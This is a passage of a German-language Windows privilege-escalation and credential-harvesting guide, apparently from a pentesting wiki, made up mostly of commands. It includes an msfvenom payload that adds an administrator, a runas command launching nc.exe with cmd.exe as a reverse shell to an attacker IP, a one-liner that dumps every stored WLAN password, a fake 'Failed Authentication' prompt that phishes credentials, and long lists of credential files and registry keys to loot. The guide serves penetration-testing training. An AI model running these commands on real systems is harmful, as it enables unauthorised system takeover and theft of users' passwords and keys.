gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Sie können** diese Schwachstelle mit Metasploit erkennen und ausnutzen: `exploit/windows/local/trusted\_service\_path` Sie können manuell einen Dienst-Binärdatei mit Metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsmaßnahmen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die im Falle eines Dienstfehlers ausgeführt werden sollen. Diese Funktion kann so konfiguriert werden, dass sie auf eine ausführbare Datei verweist. Wenn diese Datei austauschbar ist, könnte eine Privilegieneskalation möglich sein. Weitere Details finden Sie in der [offiziellen Dokumentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Anwendungen

### Installierte Anwendungen

Überprüfen Sie die **Berechtigungen der ausführbaren Dateien** (vielleicht können Sie eine überschreiben und Privilegien eskalieren) und der **Ordner** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Überprüfen Sie, ob Sie einige Konfigurationsdateien ändern können, um auf bestimmte spezielle Dateien zuzugreifen, oder ob Sie einige ausführbare Dateien ändern können, die von einem Administrator-Konto ausgeführt werden (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, besteht darin:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Beim Start ausführen

**Überprüfen Sie, ob Sie einige Registrierungseinträge oder Binärdateien überschreiben können, die von einem anderen Benutzer ausgeführt werden.**\
**Lesen Sie** die **folgende Seite**, um mehr über interessante **Autorun-Standorte zur Eskalation von Berechtigungen** zu erfahren:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Treiber

Suchen Sie nach möglichen **Drittanbieter seltsamen/verwundbaren** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Wenn Sie **Schreibberechtigungen in einem auf dem PATH vorhandenen Ordner** haben, könnten Sie in der Lage sein, eine von einem Prozess geladene DLL zu hijacken und **Berechtigungen zu eskalieren**.

Überprüfen Sie die Berechtigungen aller Ordner im PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Für weitere Informationen darüber, wie man diese Überprüfung missbrauchen kann:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Netzwerk

### Freigaben
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### Hosts-Datei

Überprüfen Sie, ob andere bekannte Computer fest in der Hosts-Datei eingetragen sind.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Überprüfen Sie **eingeschränkte Dienste** von außen
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Regeln

[**Überprüfen Sie diese Seite für Firewall-bezogene Befehle**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, ausschalten, ausschalten...)**

Weitere [Befehle zur Netzwerkenumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem für Linux (WSL)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Der Binär `bash.exe` kann auch in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden.

Wenn Sie Root-Benutzer werden, können Sie auf jedem Port zuhören (das erste Mal, wenn Sie `nc.exe` verwenden, um auf einem Port zuzuhören, wird es über die GUI fragen, ob `nc` durch die Firewall zugelassen werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um Bash einfach als Root zu starten, können Sie `--default-user root` ausprobieren.

Sie können das Dateisystem von `WSL` im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Anmeldeinformations-Manager / Windows-Tresor

Von [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows-Tresor speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen **Windows die Benutzer automatisch anmelden kann**. Auf den ersten Blick mag es so aussehen, als könnten Benutzer ihre Facebook-Anmeldeinformationen, Twitter-Anmeldeinformationen, Gmail-Anmeldeinformationen usw. speichern, um sich automatisch über Browser anzumelden. Aber das ist nicht der Fall.

Der Windows-Tresor speichert Anmeldeinformationen, mit denen Windows die Benutzer automatisch anmelden kann, was bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource zuzugreifen** (Server oder eine Website) **diesen Anmeldeinformations-Manager & Windows-Tresor nutzen kann** und die bereitgestellten Anmeldeinformationen anstelle der Benutzereingabe des Benutzernamens und des Kennworts verwenden kann.

Es ist meiner Meinung nach nicht möglich, dass Anwendungen die Anmeldeinformationen für eine bestimmte Ressource verwenden, es sei denn, sie interagieren mit dem Anmeldeinformations-Manager. Wenn Ihre Anwendung also den Tresor nutzen möchte, sollte sie irgendwie **mit dem Anmeldeinformations-Manager kommunizieren und die Anmeldeinformationen für diese Ressource aus dem Standardspeichertresor anfordern**.

Verwenden Sie `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Gerät aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit den Optionen `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu verwenden. Das folgende Beispiel ruft eine entfernte Binärdatei über einen SMB-Freigabe auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwenden von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachten Sie, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html) oder aus dem [Empire Powershells Modul](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um signifikant zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung nutzt es die Domänenauthentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel werden unter Verwendung von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` die [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Key, der die privaten Schlüssel des Benutzers in derselben Datei schützt, abgelegt ist**, besteht typischerweise aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, was verhindert, dass der Inhalt über den `dir`-Befehl in CMD aufgelistet wird, obwohl er über PowerShell aufgelistet werden kann).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Sie können das **Mimikatz-Modul** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **von dem Masterpasswort geschützten Anmeldedaten-Dateien** befinden sich normalerweise in:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz-Modul** `dpapi::cred` mit dem entsprechenden `/masterkey` verwenden, um zu entschlüsseln.\
Du kannst **viele DPAPI** **Masterkeys** aus dem **Speicher** mit dem Modul `sekurlsa::dpapi` extrahieren (wenn du root bist).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind durch **DPAPI** geschützt, was in der Regel bedeutet, dass sie nur vom selben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Um **eine PS-Anmeldeinformationen** aus der Datei, die sie enthält, zu entschlüsseln, kannst du Folgendes tun:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WLAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie können sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` finden\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Kürzlich ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop-Anmeldeinformations-Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwenden Sie das **Mimikatz** `dpapi::rdg` Modul mit dem entsprechenden `/masterkey`, um **alle .rdg-Dateien zu entschlüsseln**.\
Sie können **viele DPAPI-Masterkeys** aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi` Modul extrahieren.

### Sticky Notes

Menschen verwenden oft die StickyNotes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu speichern, ohne zu realisieren, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und ist es immer wert, danach zu suchen und sie zu untersuchen.

### AppCmd.exe

**Beachten Sie, dass Sie Administratorrechte benötigen und unter einem hohen Integritätslevel laufen müssen, um Passwörter von AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im `%systemroot%\system32\inetsrv\` Verzeichnis.\
Wenn diese Datei vorhanden ist, ist es möglich, dass einige **Anmeldeinformationen** konfiguriert wurden und wiederhergestellt werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Überprüfen Sie, ob `C:\Windows\CCM\SCClient.exe` existiert.\
Installationsprogramme werden mit **SYSTEM-Berechtigungen ausgeführt**, viele sind anfällig für **DLL-Sideloading (Informationen von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registrierung (Anmeldeinformationen)

### Putty-Anmeldeinformationen
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH-Hostschlüssel
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Schlüssel in der Registrierung

SSH-Private Schlüssel können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher sollten Sie überprüfen, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er wird verschlüsselt gespeichert, kann aber leicht mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Weitere Informationen zu dieser Technik finden Sie hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der Dienst `ssh-agent` nicht ausgeführt wird und Sie möchten, dass er automatisch beim Start ausgeführt wird, führen Sie aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich über SSH bei einer Maschine anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und Procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.
{% endhint %}

### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Sie können auch nach diesen Dateien mit **Metasploit** suchen: _post/windows/gather/enum\_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-Backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Anmeldeinformationen
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suchen Sie nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher war es möglich, benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Maschinen über Gruppenrichtlinienvoreinstellungen (GPP) bereitzustellen. Dieser Ansatz wies jedoch erhebliche Sicherheitslücken auf. Erstens konnten die Gruppenrichtlinienobjekte (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domänenbenutzer abgerufen werden. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standardschlüssels verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernsthaftes Risiko dar, da es Benutzern ermöglichen könnte, erhöhte Berechtigungen zu erlangen.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, um nach lokal zwischengespeicherten GPP-Dateien zu suchen, die ein nicht leeres "cpassword"-Feld enthalten. Beim Auffinden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei, was bei der Identifizierung und Behebung dieser Sicherheitslücke hilft.

Suchen Sie in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Zum Entschlüsseln des cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Verwendung von crackmapexec, um die Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Konfiguration
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel einer web.config mit Anmeldedaten:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN Anmeldedaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Anmeldeinformationen fragen

Sie können den Benutzer immer auffordern, seine Anmeldeinformationen oder sogar die Anmeldeinformationen eines anderen Benutzers einzugeben, wenn Sie glauben, dass er sie kennen könnte (beachten Sie, dass das direkte **Auffordern** des Clients nach den **Anmeldeinformationen** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die Anmeldeinformationen enthalten**

Bekannte Dateien, die früher **Passwörter** im **Klartext** oder **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Durchsuchen Sie alle vorgeschlagenen Dateien:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Anmeldeinformationen im Papierkorb

Sie sollten auch den Papierkorb überprüfen, um nach darin enthaltenen Anmeldeinformationen zu suchen.

Um **Passwörter wiederherzustellen**, die von verschiedenen Programmen gespeichert wurden, können Sie verwenden: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Im Registrierungseditor

**Andere mögliche Registrierungsschlüssel mit Anmeldeinformationen**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extrahieren von openssh-Schlüsseln aus der Registrierung.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Überprüfen Sie auch den Verlauf, Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter gespeichert sind**.

Tools zum Extrahieren von Passwörtern aus Browsern:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL-Überschreibung**

